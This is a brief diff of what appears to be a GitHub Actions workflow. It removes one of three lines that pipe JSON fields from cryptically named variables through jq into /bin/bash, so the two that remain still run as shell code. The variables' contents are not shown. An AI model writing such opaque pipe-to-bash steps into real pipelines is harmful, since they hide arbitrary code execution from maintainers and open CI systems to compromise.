@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$kh515" | jq -r .x75 | /bin/bash
           echo $t04 | jq -r .jmz325 | /bin/bash
-          echo $webv0595 | jq -r .ahcl4700 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
